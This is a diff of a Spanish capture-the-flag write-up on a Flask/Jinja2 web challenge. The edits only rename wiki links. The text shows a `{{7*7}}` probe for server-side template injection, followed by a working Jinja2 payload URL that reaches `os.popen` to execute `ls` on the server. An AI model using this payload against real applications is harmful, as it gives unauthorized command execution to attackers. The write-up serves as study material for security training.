@@ -13,13 +13,13 @@ Es uno de los challenges de la sección de *web*.
 
 ## Reconocimiento
 
-Al acceder por el navegador, vemos una página muy simple. Como podemos leer está creada en *flask/jinja2* ([[flask 1]]).
+Al acceder por el navegador, vemos una página muy simple. Como podemos leer está creada en *flask/jinja2* ([[flask]]).
 
 Si probamos a acceder a un recurso, por ejemplo a `http://ip/hola`, veremos que se muestra `'hola'` en la página. Si probamos con `{{7*7}}`, se renderiza un `49`. Por tanto podemos suponer que existe una vulnerabilidad de [[SSTI]].
 
 ## Explotación
 
-Para explotar dicha vuln tan solo debemos hacer una inyección de código [[python 1]] como la siguiente:
+Para explotar dicha vuln tan solo debemos hacer una inyección de código [[python]] como la siguiente:
 
 ```url
 http://ip/{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
